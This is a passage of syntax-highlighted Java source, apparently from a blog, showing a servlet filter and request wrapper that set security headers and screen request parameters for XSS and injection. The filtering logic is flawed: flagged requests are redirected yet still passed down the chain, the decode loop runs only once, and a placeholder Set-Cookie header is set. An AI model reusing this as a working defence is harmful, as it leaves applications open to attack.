class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dayainfo.ssp.common.safety;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IllegalCharacterFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> {</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 不需要被过滤器拦截的页面 ，主要用于静态资源的放行</span></span><br><span class="line"><span class="comment">     * 在web.xml中配置filter的init-param</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String excludedPaths;</span><br><span class="line">    <span class="keyword">private</span> String[] excludedPathArray;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException {</span><br><span class="line">        <span class="comment">// 初始化时读取web.xml中配置的init-param</span></span><br><span class="line">        excludedPaths = filterConfig.getInitParameter(<span class="string">"excludedPaths"</span>);</span><br><span class="line">        <span class="keyword">if</span> (!StringUtils.isEmpty(excludedPaths)) {</span><br><span class="line">            excludedPathArray = excludedPaths.split(<span class="string">","</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException {</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">        <span class="type">HttpServletResponse</span> <span class="variable">resp</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getServletPath();<span class="comment">// 要访问的url</span></span><br><span class="line">        <span class="comment">// 判断是否是直接放行的请求</span></span><br><span class="line">        <span class="keyword">if</span> (url.contains(<span class="string">"/overtime"</span>) || isFilterExcludeRequest(request)) {</span><br><span class="line">            <span class="comment">// 会丢参的访问</span></span><br><span class="line">            chain.doFilter(request, res);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// 非法请求检查</span></span><br><span class="line">            <span class="type">AtomicBoolean</span> <span class="variable">checkIllegal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>();</span><br><span class="line">            <span class="comment">// 添加X-Frame-Options响应头</span></span><br><span class="line">            resp.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line">            resp.addHeader(<span class="string">"X-Frame-Options"</span>, <span class="string">"SAMEORIGIN"</span>);</span><br><span class="line">            resp.addHeader(<span class="string">"X-Download-Options"</span>, <span class="string">"noopen"</span>);</span><br><span class="line">            resp.addHeader(<span class="string">"X-Permitted-Cross-Domain-Policies"</span>, <span class="string">"master-only"</span>);</span><br><span class="line">            resp.setHeader(<span class="string">"strict-transport-security"</span>, <span class="string">"max-age=16070400; includeSubDomains"</span>);</span><br><span class="line">            resp.addHeader(<span class="string">"Referrer-Policy"</span>, <span class="string">"no-referrer-when-downgrade"</span>);</span><br><span class="line">            resp.addHeader(<span class="string">"Set-Cookie"</span>, <span class="string">"cookiename=value;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly"</span>);</span><br><span class="line">            request = <span class="keyword">new</span> <span class="title class_">MHttpServletRequest</span>(request, checkIllegal);</span><br><span class="line">            <span class="keyword">if</span> (checkIllegal.get()) {</span><br><span class="line">                <span class="comment">// 非法请求拦截</span></span><br><span class="line">                resp.sendRedirect(<span class="string">"/publicUser/overtime?state=100011"</span>);</span><br><span class="line">            }</span><br><span class="line">            chain.doFilter(request, resp);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 54</span></span><br><span class="line"><span class="comment">     * 判断是否是 过滤器直接放行的请求</span></span><br><span class="line"><span class="comment">     * 55</span></span><br><span class="line"><span class="comment">     * &lt;br/&gt;主要用于静态资源的放行</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 58</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isFilterExcludeRequest</span><span class="params">(HttpServletRequest request)</span> {</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">null</span> != excludedPathArray &amp;&amp; excludedPathArray.length &gt; <span class="number">0</span>) {</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getServletPath();</span><br><span class="line">            <span class="keyword">for</span> (String ecludedUrl : excludedPathArray) {</span><br><span class="line">                <span class="keyword">if</span> (ecludedUrl.startsWith(<span class="string">"*."</span>)) {</span><br><span class="line">                    <span class="comment">// 如果配置的是后缀匹配, 则把前面的*号干掉，然后用endWith来判断</span></span><br><span class="line">                    <span class="keyword">if</span> (url.endsWith(ecludedUrl.substring(<span class="number">1</span>))) {</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">else</span> <span class="keyword">if</span> (ecludedUrl.endsWith(<span class="string">"/*"</span>)) {</span><br><span class="line">                    <span class="keyword">if</span> (!ecludedUrl.startsWith(<span class="string">"/"</span>)) {</span><br><span class="line">                        <span class="comment">// 前缀匹配，必须要是/开头</span></span><br><span class="line">                        ecludedUrl = <span class="string">"/"</span> + ecludedUrl;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="comment">// 如果配置是前缀匹配, 则把最后的*号干掉，然后startWith来判断</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">prffixStr</span> <span class="operator">=</span> request.getContextPath() + ecludedUrl.substring(<span class="number">0</span>, ecludedUrl.length() - <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (url.startsWith(prffixStr)) {</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    }</span><br><span class="line">                } <span class="keyword">else</span> {</span><br><span class="line">                    <span class="comment">// 如果不是前缀匹配也不是后缀匹配,那就是全路径匹配</span></span><br><span class="line">                    <span class="keyword">if</span> (!ecludedUrl.startsWith(<span class="string">"/"</span>)) {</span><br><span class="line">                        <span class="comment">// 全路径匹配，也必须要是/开头</span></span><br><span class="line">                        ecludedUrl = <span class="string">"/"</span> + ecludedUrl;</span><br><span class="line">                    }</span><br><span class="line">                    <span class="type">String</span> <span class="variable">targetUrl</span> <span class="operator">=</span> request.getContextPath() + ecludedUrl;</span><br><span class="line">                    <span class="keyword">if</span> (url.equals(targetUrl)) {</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dayainfo.ssp.common.safety;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dayainfo.ssp.common.safety.util.XssShieldUtil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequestWrapper;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MHttpServletRequest</span> <span class="keyword">extends</span> <span class="title class_">HttpServletRequestWrapper</span> {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非法请求标记，存在注入嫌疑，禁止访问</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AtomicBoolean checkIllegal;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MHttpServletRequest</span><span class="params">(HttpServletRequest request, AtomicBoolean checkIllegal)</span> {</span><br><span class="line">        <span class="built_in">super</span>(request);</span><br><span class="line">        <span class="built_in">this</span>.checkIllegal = checkIllegal;</span><br><span class="line">        doParamFilter();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getParameter</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nameFilter</span> <span class="operator">=</span> XssShieldUtil.stripXss(name, checkIllegal);</span><br><span class="line">        <span class="comment">// 返回值之前 先进行过滤</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">super</span>.getParameter(nameFilter);</span><br><span class="line">        <span class="keyword">return</span> XssShieldUtil.stripXss(nameFilter, value, checkIllegal);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] getParameterValues(String name) {</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nameFilter</span> <span class="operator">=</span> XssShieldUtil.stripXss(name, checkIllegal);</span><br><span class="line">        <span class="comment">// 返回值之前 先进行过滤</span></span><br><span class="line">        String[] values = <span class="built_in">super</span>.getParameterValues(nameFilter);</span><br><span class="line">        <span class="keyword">if</span> (values != <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; values.length; i++) {</span><br><span class="line">                values[i] = XssShieldUtil.stripXss(nameFilter, values[i], checkIllegal);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> values;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doParamFilter</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">for</span> (String name : <span class="built_in">this</span>.getParameterMap().keySet()){</span><br><span class="line">            <span class="built_in">this</span>.getParameterValues(name);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dayainfo.ssp.common.safety.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.dayainfo.ssp.common.safety.constant.SafeFilterConstant;</span><br><span class="line"><span class="keyword">import</span> com.dayainfo.ssp.common.util.EscapeUnescape;</span><br><span class="line"><span class="keyword">import</span> com.dayainfo.ssp.common.util.StringUtil;</span><br><span class="line"><span class="keyword">import</span> javafx.util.Pair;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.atomic.AtomicBoolean;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 处理非法字符</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XssShieldUtil</span> {</span><br><span class="line">    <span class="keyword">static</span> String <span class="title function_">decodeParam</span><span class="params">(String value)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isEmpty(value)) {</span><br><span class="line">                <span class="keyword">return</span> value;</span><br><span class="line">            }</span><br><span class="line">            <span class="type">int</span> <span class="variable">totalCount</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">while</span> (value.contains(<span class="string">"%"</span>) &amp;&amp; --totalCount &gt; <span class="number">0</span>) {</span><br><span class="line">                value = URLDecoder.decode(value, <span class="string">"UTF-8"</span>);</span><br><span class="line">            }</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            <span class="keyword">if</span> (e.getClass().getName().contains(<span class="string">"NumberFormatException"</span>) &amp;&amp; value.contains(<span class="string">"%"</span>)) {</span><br><span class="line">                value = value.replaceAll(<span class="string">"%"</span>, <span class="string">""</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (value.contains(<span class="string">"%"</span>)) {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="type">int</span> <span class="variable">totalCount</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">while</span> (value.contains(<span class="string">"%"</span>) &amp;&amp; --totalCount &gt; <span class="number">0</span>) {</span><br><span class="line">                    value = EscapeUnescape.unescape(value);</span><br><span class="line">                }</span><br><span class="line">            } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (value.contains(<span class="string">"%"</span>)) {</span><br><span class="line">            System.out.printf(<span class="string">"【decode失败】：%s\n"</span>, value);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFilter</span><span class="params">(String name)</span> {</span><br><span class="line">        <span class="keyword">return</span> !StringUtils.isEmpty(name) &amp;&amp; SafeFilterConstant.noFilterList.contains(name);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stripXss</span><span class="params">(String name, String value, AtomicBoolean checkIllegal)</span> {</span><br><span class="line">        <span class="keyword">if</span> (checkFilter(name)) {</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> stripXss(value, checkIllegal);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 过滤清理</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">stripXss</span><span class="params">(String value, AtomicBoolean checkIllegal)</span> {</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">tmpValue</span> <span class="operator">=</span> value;</span><br><span class="line">        <span class="comment">// URLDecode</span></span><br><span class="line">        value = decodeParam(value);</span><br><span class="line">        <span class="comment">// 放行</span></span><br><span class="line">        <span class="keyword">if</span> (checkFilter(value)) {</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(value)) {</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (patternToEmpty(value)) {</span><br><span class="line">            <span class="comment">// 非法请求，禁止访问</span></span><br><span class="line">            checkIllegal.set(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// JSON数据通过验证</span></span><br><span class="line">        <span class="keyword">if</span> (isJson(value)) {</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 过滤危险字符</span></span><br><span class="line">        value = patternToReplace(value);</span><br><span class="line">        <span class="keyword">if</span> (tmpValue != <span class="literal">null</span> &amp;&amp; !tmpValue.equals(value)) {</span><br><span class="line">            System.out.printf(<span class="string">"【%s】----【%s】\n"</span>, tmpValue, value);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证是否直接清理参数内容</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">patternToEmpty</span><span class="params">(String value)</span> {</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">testValue</span> <span class="operator">=</span> value.toLowerCase(Locale.ROOT);</span><br><span class="line">        <span class="keyword">for</span> (Pattern pattern : XssPatternGroup.LIST_PATTERNS_DELETE) {</span><br><span class="line">            matcher = pattern.matcher(testValue);</span><br><span class="line">            <span class="keyword">while</span> (matcher.find()) {</span><br><span class="line">                <span class="keyword">if</span> (StringUtil.isEmpty(matcher.group())) {</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                }</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证是否直接替换参数内容</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> String <span class="title function_">patternToReplace</span><span class="params">(String value)</span> {</span><br><span class="line">        <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">for</span> (Pattern pattern : XssPatternGroup.LIST_PATTERNS_REPLACE_TO_EMPTY) {</span><br><span class="line">            matcher = pattern.matcher(value);</span><br><span class="line">            <span class="comment">// 匹配</span></span><br><span class="line">            <span class="keyword">if</span> (matcher.find()) {</span><br><span class="line">                <span class="comment">// 删除相关字符串</span></span><br><span class="line">                value = matcher.replaceAll(<span class="string">""</span>);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isJson</span><span class="params">(String json)</span> {</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">testJson</span> <span class="operator">=</span> json.toLowerCase(Locale.ROOT);</span><br><span class="line">        <span class="comment">// JSON数据通过验证</span></span><br><span class="line">        <span class="keyword">if</span> (testJson.contains(<span class="string">"/${"</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> ((json.contains(<span class="string">"{"</span>) &amp;&amp; json.contains(<span class="string">"}"</span>)) || (json.contains(<span class="string">"["</span>) &amp;&amp; json.contains(<span class="string">"]"</span>))) {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                JSON.parse(json);</span><br><span class="line">                result = <span class="literal">true</span>;</span><br><span class="line">            } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">                System.out.println(<span class="string">"JSON数据被拦截："</span> + json);</span><br><span class="line">                result = <span class="literal">false</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dayainfo.ssp.common.safety.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: DH</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2022/4/20</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@desc</span>:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">XssPatternGroup</span> {</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> List&lt;Pattern&gt; LIST_PATTERNS_DELETE = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> List&lt;Pattern&gt; LIST_PATTERNS_REPLACE_TO_EMPTY = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> {</span><br><span class="line">        <span class="keyword">for</span> (Object[] arr : getXssPatternToNullList()) {</span><br><span class="line">            LIST_PATTERNS_DELETE.add(Pattern.compile((String) arr[<span class="number">0</span>], (Integer) arr[<span class="number">1</span>]));</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (Object[] arr : getXssPatternToEmptyList()) {</span><br><span class="line">            LIST_PATTERNS_REPLACE_TO_EMPTY.add(Pattern.compile((String) arr[<span class="number">0</span>], (Integer) arr[<span class="number">1</span>]));</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 正则匹配上：清空参数所有内容</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> List&lt;Object[]&gt; getXssPatternToNullList() {</span><br><span class="line">        List&lt;Object[]&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Object[]&gt;();</span><br><span class="line">        ret.add(<span class="keyword">new</span> <span class="title class_">Object</span>[]{<span 